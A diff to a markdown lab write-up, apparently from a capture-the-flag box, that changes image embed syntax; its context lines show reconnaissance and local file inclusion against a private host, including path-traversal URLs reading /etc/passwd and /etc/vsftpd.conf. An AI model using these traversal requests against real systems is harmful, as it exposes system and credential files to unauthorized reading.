@@ -110,7 +110,7 @@ drwxrwxrwx    2 0        0            4096 Feb 08  2020 pub
 ```
 
 http://192.168.143.14/robots.txt
-![](Pasted%20image%2020260517171811.png)
+![[Pasted image 20260517171811.png]]
 
 ```zsh
 sudo curl -s --user-agent Googlebot http://192.168.143.14/robots.txt -v
@@ -143,7 +143,7 @@ Disallow: /secret_information/
 * Connection #0 to host 192.168.143.14:80 left intact
 ```
 
-![](Pasted%20image%2020260517173155.png)
+![[Pasted image 20260517173155.png]]
 
 ### Click english 
 
@@ -153,11 +153,11 @@ http://192.168.143.14/secret_information/?lang=en.php
 
 http://192.168.143.14/secret_information/?lang=../../../../etc/passwd
 
-![](Pasted%20image%2020260517175022.png)
+![[Pasted image 20260517175022.png]]
 
 http://192.168.143.14/secret_information/?lang=../../../../etc/vsftpd.conf
 
-![](Pasted%20image%2020260517181205.png)
+![[Pasted image 20260517181205.png]]
 
 ---
 
